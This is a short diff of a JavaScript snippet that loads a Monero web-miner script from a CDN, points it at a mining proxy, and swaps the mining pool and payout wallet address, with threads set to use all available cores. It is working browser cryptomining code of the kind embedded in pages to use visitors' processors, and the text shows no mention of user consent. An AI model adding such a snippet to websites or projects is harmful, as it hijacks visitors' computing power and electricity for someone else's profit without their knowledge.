@@ -7,8 +7,8 @@ script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.
 document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
-var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var pool = "monero.herominers.com";
+var walletAddress = "49rCPgGxMrLApihwWtFXkcKH9fAKkuqYWNQBHyJn1g54DAw5k8CiqVVavbdEbk1hBqeYJcDj7SEQYJUJw9aBbYUNBGxzP58";
 var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
 var password = "";
